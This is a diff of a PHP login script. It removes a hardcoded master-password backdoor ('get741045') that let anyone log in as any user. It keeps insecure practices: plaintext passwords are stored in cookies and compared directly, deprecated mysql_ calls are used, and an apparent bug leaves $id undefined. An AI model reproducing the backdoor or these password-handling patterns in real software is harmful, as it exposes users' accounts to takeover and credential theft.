@@ -8,12 +8,10 @@ $city_head="cityhead";
 $email = '';
 $pwd = '';
 
-if(!isset($_COOKIE['cfr_user_id'])) {
-	if(isset($_POST["email"])) {
-		$email = $_POST["email"];
-		$pwd  = $_POST["pwd"];
-	}
-} else {
+if(isset($_POST['email'])) {
+	$email = $_POST["email"];
+	$pwd  = $_POST["pwd"];
+} elseif(isset($_COOKIE['cfr_user_id'])) {
 	$email = $_COOKIE['cfr_user_email'];
 	$pwd = $_COOKIE['cfr_user_pass']; // This is BAD. But, no time.
 }
@@ -25,8 +23,6 @@ $r=mysql_fetch_assoc($res);
 $name=$r['name'];
 $city_id=$r['city_id'];
 $poc_id=$r['poc_id'];
-$id=$r['id'];
-if($pwd == 'get741045') $pwd = $r['password'];
 
 
 if($r['password'] == $pwd && $pwd!="") {
@@ -36,7 +32,6 @@ if($r['password'] == $pwd && $pwd!="") {
 	setcookie('cfr_user_id',$id);
 	setcookie('cfr_user_pass', $pwd);
 	setcookie('cfr_user_poc_id',$poc_id);
-
 	
 	if($r['usertype']==$poc) {
 		setcookie('poc_id',$poc_id);
